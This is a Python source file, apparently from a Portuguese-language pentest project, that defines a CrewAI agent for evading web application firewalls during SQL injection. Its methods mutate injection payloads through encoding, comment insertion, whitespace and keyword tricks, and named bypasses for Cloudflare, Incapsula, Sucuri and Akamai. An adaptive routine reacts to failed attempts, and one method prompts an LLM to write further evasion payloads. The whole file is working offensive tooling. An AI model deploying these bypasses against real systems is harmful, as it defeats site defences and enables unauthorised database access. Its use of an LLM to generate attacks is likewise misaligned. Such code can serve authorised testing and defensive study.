"""
Agent Evasion Specialist - Bypass de filtros e WAFs
"""
from crewai import Agent
from langchain_openai import ChatOpenAI
from typing import Dict, List
import urllib.parse
import base64
import html
from config import Config

class EvasionSpecialistAgent:
    def __init__(self):
        self.llm = ChatOpenAI(
            model=Config.OPENAI_MODEL,
            temperature=Config.TEMPERATURE,
            max_tokens=Config.MAX_TOKENS,
            api_key=Config.OPENAI_API_KEY
        )
        
        self.agent = Agent(
            role="WAF Evasion Specialist",
            goal="Desenvolver técnicas de bypass para contornar filtros e WAFs em testes de SQL Injection",
            backstory="""Você é um especialista em evasão de sistemas de segurança com conhecimento
            profundo sobre WAFs, filtros de entrada e técnicas de obfuscação. Sua expertise permite
            contornar as mais diversas proteções para realizar testes de penetração eficazes.""",
            verbose=True,
            allow_delegation=False,
            llm=self.llm
        )
    
    def generate_evasion_payloads(self, original_payload: str, waf_type: str = None, 
                                 context: Dict = None) -> List[str]:
        """Gera payloads com técnicas de evasão"""
        evasion_payloads = []
        
        # Aplicar múltiplas técnicas de evasão
        evasion_payloads.extend(self._case_variation(original_payload))
        evasion_payloads.extend(self._comment_insertion(original_payload))
        evasion_payloads.extend(self._encoding_techniques(original_payload))
        evasion_payloads.extend(self._whitespace_manipulation(original_payload))
        evasion_payloads.extend(self._keyword_replacement(original_payload))
        evasion_payloads.extend(self._function_alternatives(original_payload))
        
        # Técnicas específicas por WAF
        if waf_type:
            evasion_payloads.extend(self._waf_specific_bypass(original_payload, waf_type))
        
        # Remover duplicatas e retornar
        return list(set(evasion_payloads))
    
    def _case_variation(self, payload: str) -> List[str]:
        """Variações de case para bypass"""
        variations = []
        
        # Case mixing
        variations.append(payload.upper())
        variations.append(payload.lower())
        
        # Alternating case
        alt_case = ""
        for i, char in enumerate(payload):
            if i % 2 == 0:
                alt_case += char.upper()
            else:
                alt_case += char.lower()
        variations.append(alt_case)
        
        # Random case for keywords
        keywords = ['OR', 'AND', 'UNION', 'SELECT', 'FROM', 'WHERE']
        for keyword in keywords:
            if keyword.upper() in payload.upper():
                # Mixed case variations
                variations.append(payload.replace(keyword.upper(), keyword.capitalize()))
                variations.append(payload.replace(keyword.upper(), keyword.lower()))
        
        return variations
    
    def _comment_insertion(self, payload: str) -> List[str]:
        """Inserção de comentários para bypass"""
        variations = []
        
        # MySQL comment variations
        variations.append(payload.replace(' ', '/**/'))
        variations.append(payload.replace(' OR ', ' /**/OR/**/'))
        variations.append(payload.replace(' AND ', ' /**/AND/**/'))
        variations.append(payload.replace('UNION', '/*!UNION*/'))
        variations.append(payload.replace('SELECT', '/*!SELECT*/'))
        
        # Version-specific comments
        variations.append(payload.replace('UNION', '/*!50000UNION*/'))
        variations.append(payload.replace('SELECT', '/*!50000SELECT*/'))
        
        # Inline comments
        variations.append(payload.replace('=', '/*comment*/=/*comment*/'))
        variations.append(payload.replace("'", "'/*comment*/"))
        
        return variations
    
    def _encoding_techniques(self, payload: str) -> List[str]:
        """Técnicas de encoding"""
        variations = []
        
        # URL encoding
        variations.append(urllib.parse.quote(payload))
        variations.append(urllib.parse.quote_plus(payload))
        
        # Double URL encoding
        double_encoded = urllib.parse.quote(urllib.parse.quote(payload))
        variations.append(double_encoded)
        
        # Hex encoding
        hex_encoded = ''.join([f'%{ord(c):02x}' for c in payload])
        variations.append(hex_encoded)
        
        # Unicode encoding
        unicode_encoded = ''.join([f'\\u{ord(c):04x}' for c in payload])
        variations.append(unicode_encoded)
        
        # HTML entity encoding
        html_encoded = html.escape(payload)
        variations.append(html_encoded)
        
        # Base64 encoding (for specific contexts)
        try:
            b64_encoded = base64.b64encode(payload.encode()).decode()
            variations.append(f"CONVERT(FROM_BASE64('{b64_encoded}'), CHAR)")
        except:
            pass
        
        return variations
    
    def _whitespace_manipulation(self, payload: str) -> List[str]:
        """Manipulação de espaços em branco"""
        variations = []
        
        # Tab replacement
        variations.append(payload.replace(' ', '\t'))
        variations.append(payload.replace(' ', '\n'))
        variations.append(payload.replace(' ', '\r'))
        
        # Multiple spaces
        variations.append(payload.replace(' ', '  '))
        variations.append(payload.replace(' ', '   '))
        
        # Mixed whitespace
        variations.append(payload.replace(' ', ' \t'))
        variations.append(payload.replace(' ', '\t '))
        
        # No spaces
        variations.append(payload.replace(' ', ''))
        
        # Form feed and other whitespace chars
        variations.append(payload.replace(' ', '\f'))
        variations.append(payload.replace(' ', '\v'))
        
        return variations
    
    def _keyword_replacement(self, payload: str) -> List[str]:
        """Substituição de palavras-chave"""
        variations = []
        
        # Alternative operators
        replacements = {
            ' OR ': [' || ', ' | '],
            ' AND ': [' && ', ' & '],
            '=': [' LIKE ', ' REGEXP ', ' RLIKE '],
            'UNION': ['UNION ALL', 'UNION DISTINCT'],
            '--': ['#', ';%00', ' %23']
        }
        
        for original, alternatives in replacements.items():
            if original in payload:
                for alt in alternatives:
                    variations.append(payload.replace(original, alt))
        
        return variations
    
    def _function_alternatives(self, payload: str) -> List[str]:
        """Funções alternativas"""
        variations = []
        
        # String functions
        if 'CONCAT' in payload:
            variations.append(payload.replace('CONCAT', 'GROUP_CONCAT'))
        
        # Information functions
        function_alternatives = {
            'version()': ['@@version', '@@global.version'],
            'user()': ['current_user()', 'session_user()'],
            'database()': ['schema()', 'current_schema()']
        }
        
        for original, alternatives in function_alternatives.items():
            if original in payload:
                for alt in alternatives:
                    variations.append(payload.replace(original, alt))
        
        return variations
    
    def _waf_specific_bypass(self, payload: str, waf_type: str) -> List[str]:
        """Bypass específico por tipo de WAF"""
        variations = []
        
        if waf_type.lower() in ['cloudflare', 'cf-ray']:
            # Cloudflare bypasses
            variations.extend([
                payload.replace("'", "''"),
                payload.replace(' ', '/**_**/'),
                payload.replace('UNION', 'UNION/**/'),
                payload.replace('SELECT', 'SELECT/**/'),
                payload.replace('=', '/*!50000=*/')
            ])
        
        elif waf_type.lower() in ['incapsula', 'x-iinfo']:
            # Incapsula bypasses
            variations.extend([
                payload.replace(' ', '\t'),
                payload.replace('OR', 'OR/**/'),
                payload.replace('AND', 'AND/**/'),
                payload.replace("'", "\\x27")
            ])
        
        elif waf_type.lower() in ['sucuri', 'x-sucuri-id']:
            # Sucuri bypasses
            variations.extend([
                payload.replace(' ', '/**/'),
                payload.replace('UNION', '/*!UNION*/'),
                payload.replace('SELECT', '/*!SELECT*/'),
                payload.replace("'", chr(39))
            ])
        
        elif waf_type.lower() in ['akamai', 'x-akamai-transformed']:
            # Akamai bypasses
            variations.extend([
                payload.replace(' OR ', ' /**/OR/**/'),
                payload.replace('=', '/**/=/**/'),
                payload.replace("'", "\\u0027")
            ])
        
        return variations
    
    def adaptive_bypass(self, payload: str, failed_attempts: List[str], 
                       response_analysis: Dict) -> List[str]:
        """Bypass adaptativo baseado em tentativas anteriores"""
        new_payloads = []
        
        # Analisar por que os payloads anteriores falharam
        failure_patterns = self._analyze_failures(failed_attempts, response_analysis)
        
        # Gerar novos payloads baseados na análise
        for pattern in failure_patterns:
            if pattern == 'keyword_filtering':
                new_payloads.extend(self._advanced_keyword_obfuscation(payload))
            elif pattern == 'character_filtering':
                new_payloads.extend(self._advanced_character_encoding(payload))
            elif pattern == 'length_restriction':
                new_payloads.extend(self._payload_compression(payload))
            elif pattern == 'pattern_matching':
                new_payloads.extend(self._pattern_breaking(payload))
        
        return new_payloads
    
    def _analyze_failures(self, failed_attempts: List[str], 
                         response_analysis: Dict) -> List[str]:
        """Analisa padrões de falha"""
        patterns = []
        
        # Verificar se keywords específicas estão sendo bloqueadas
        blocked_keywords = ['UNION', 'SELECT', 'OR', 'AND', '--']
        for keyword in blocked_keywords:
            if any(keyword in attempt for attempt in failed_attempts):
                patterns.append('keyword_filtering')
                break
        
        # Verificar filtragem de caracteres
        special_chars = ["'", '"', ';', '--', '/*', '*/']
        for char in special_chars:
            if any(char in attempt for attempt in failed_attempts):
                patterns.append('character_filtering')
                break
        
        # Verificar restrições de tamanho
        avg_length = sum(len(attempt) for attempt in failed_attempts) / len(failed_attempts)
        if avg_length > 50:
            patterns.append('length_restriction')
        
        # Verificar matching de padrões
        if len(failed_attempts) > 5:
            patterns.append('pattern_matching')
        
        return patterns
    
    def _advanced_keyword_obfuscation(self, payload: str) -> List[str]:
        """Obfuscação avançada de keywords"""
        variations = []
        
        # Concatenation obfuscation
        variations.append(payload.replace('UNION', 'UN/**/ION'))
        variations.append(payload.replace('SELECT', 'SEL/**/ECT'))
        variations.append(payload.replace('OR', 'O/**/R'))
        
        # Character insertion
        variations.append(payload.replace('UNION', 'U%00NION'))
        variations.append(payload.replace('SELECT', 'S%00ELECT'))
        
        # Case + encoding
        encoded_union = ''.join([f'%{ord(c):02x}' for c in 'UnIoN'])
        variations.append(payload.replace('UNION', encoded_union))
        
        return variations
    
    def _advanced_character_encoding(self, payload: str) -> List[str]:
        """Encoding avançado de caracteres"""
        variations = []
        
        # Mixed encoding
        mixed_encoded = ""
        for i, char in enumerate(payload):
            if i % 3 == 0:
                mixed_encoded += f'%{ord(char):02x}'
            elif i % 3 == 1:
                mixed_encoded += f'\\x{ord(char):02x}'
            else:
                mixed_encoded += char
        variations.append(mixed_encoded)
        
        # Decimal encoding
        decimal_encoded = ''.join([f'&#{ord(c)};' for c in payload])
        variations.append(decimal_encoded)
        
        return variations
    
    def _payload_compression(self, payload: str) -> List[str]:
        """Compressão de payloads para bypass de restrições de tamanho"""
        variations = []
        
        # Shortened versions
        short_payload = payload.replace('UNION SELECT', 'UNION/**/SELECT')
        variations.append(short_payload)
        
        # Abbreviated functions
        abbreviated = payload.replace('version()', 'v()')
        variations.append(abbreviated)
        
        # Remove unnecessary spaces
        compressed = ' '.join(payload.split())
        variations.append(compressed)
        
        return variations
    
    def _pattern_breaking(self, payload: str) -> List[str]:
        """Quebra de padrões para evitar detecção"""
        variations = []
        
        # Random comment insertion
        import random
        chars = list(payload)
        for _ in range(3):
            pos = random.randint(1, len(chars)-1)
            chars.insert(pos, '/**/')
        variations.append(''.join(chars))
        
        # Variable spacing
        spaced = ""
        for char in payload:
            spaced += char
            if random.random() > 0.7:
                spaced += " "
        variations.append(spaced)
        
        return variations
    
    def generate_ai_evasion(self, payload: str, waf_info: Dict) -> List[str]:
        """Usa IA para gerar técnicas de evasão personalizadas"""
        prompt = f"""
        Como especialista em bypass de WAF, gere 5 variações do payload para evadir a seguinte proteção:
        
        Payload original: {payload}
        WAF detectado: {waf_info.get('type', 'Unknown')}
        Informações adicionais: {waf_info}
        
        Considere:
        1. Técnicas de encoding específicas
        2. Obfuscação de keywords
        3. Manipulação de caracteres especiais
        4. Inserção de comentários
        5. Variações de sintaxe SQL
        
        Retorne apenas os payloads modificados, um por linha.
        """
        
        try:
            response = self.llm.invoke(prompt)
            payloads = [line.strip() for line in response.content.split('\n') if line.strip()]
            return payloads[:5]
        except Exception as e:
            print(f"Erro ao gerar evasão com IA: {e}")
            return []
